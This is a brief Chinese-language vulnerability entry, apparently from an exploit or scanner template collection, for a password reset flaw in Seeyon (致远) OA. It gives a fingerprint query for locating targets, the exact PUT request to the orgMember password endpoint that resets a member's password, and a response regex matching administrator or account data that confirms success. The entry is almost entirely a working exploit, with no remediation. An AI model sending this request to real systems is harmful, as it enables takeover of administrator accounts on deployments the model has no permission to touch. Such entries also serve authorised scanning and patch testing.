# 致远OAucpcLogin密码重置漏洞

致远OA ｜ 其他 ｜ —
- **指纹**：`app="致远A8"`
- **请求**：`PUT /seeyon/rest/orgMember/-4401606663639775639/password/share.do HTTP/1.1`
- **响应特征**：200 ^(?=.*?(?:orgAccountId|管理员)).*?$